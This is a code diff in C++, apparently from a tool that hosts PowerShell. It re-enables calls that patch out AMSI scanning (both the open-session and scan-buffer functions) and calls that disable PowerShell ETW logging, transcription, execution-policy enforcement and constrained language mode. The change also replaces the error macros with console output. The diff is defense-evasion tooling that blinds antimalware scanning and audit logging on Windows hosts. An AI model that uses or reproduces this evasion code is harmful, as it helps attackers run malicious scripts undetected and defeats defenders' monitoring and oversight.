@@ -121,32 +121,39 @@ exit:
 
     return bResult;
 }
+#include <iostream>
 
 void PatchAllTheThings(mscorlib::_AppDomain* pAppDomain)
 {
-    //if (!PatchAmsiOpenSession()) {
-    //    PRINT_ERROR("Failed to disable AMSI (1).\n");
-    //}
-
-    //if (!PatchAmsiScanBuffer()) {
-    //    PRINT_ERROR("Failed to disable AMSI (2).\n");
-    //}
-
-    if (!DisablePowerShellEtwProvider(pAppDomain)) {
-        PRINT_ERROR("Failed to disable ETW Provider.\n");
+    if (!PatchAmsiOpenSession()) {
+        //PRINT_ERROR("Failed to disable AMSI (1).\n");
+        std::cout << "Failed to disable AMSI 1" << std::endl;
     }
 
-    //if (!PatchTranscriptionOptionFlushContentToDisk(pAppDomain)) {
-    //    PRINT_ERROR("Failed to disable Transcription.\n");
-    //}
+    if (!PatchAmsiScanBuffer()) {
+        //PRINT_ERROR("Failed to disable AMSI (2).\n");
+        std::cout << "Failed to disable AMSI 2" << std::endl;
+    }
 
-    //if (!PatchAuthorizationManagerShouldRunInternal(pAppDomain)) {
-    //    PRINT_ERROR("Failed to disable Execution Policy enforcement.\n");
-    //}
+    if (!DisablePowerShellEtwProvider(pAppDomain)) {
+        //PRINT_ERROR("Failed to disable ETW Provider.\n");
+        std::cout << "Failed to disable ETW Provider" << std::endl;
+    }
 
-    //if (!PatchSystemPolicyGetSystemLockdownPolicy(pAppDomain)) {
-    //    PRINT_ERROR("Failed to disable Constrained Mode Language.\n");
-    //}
+    if (!PatchTranscriptionOptionFlushContentToDisk(pAppDomain)) {
+        //PRINT_ERROR("Failed to disable Transcription.\n");
+        std::cout << "Failed to disable Transcription." << std::endl;
+    }
+
+    if (!PatchAuthorizationManagerShouldRunInternal(pAppDomain)) {
+        //PRINT_ERROR("Failed to disable Execution Policy enforcement.\n");
+        std::cout << "Failed to disable Execution Policy enforcement" << std::endl;
+    }
+
+    if (!PatchSystemPolicyGetSystemLockdownPolicy(pAppDomain)) {
+        //PRINT_ERROR("Failed to disable Constrained Mode Language.\n");
+        std::cout << "Failed to disable Constrained Mode Language." << std::endl;
+    }
 
 
     return;
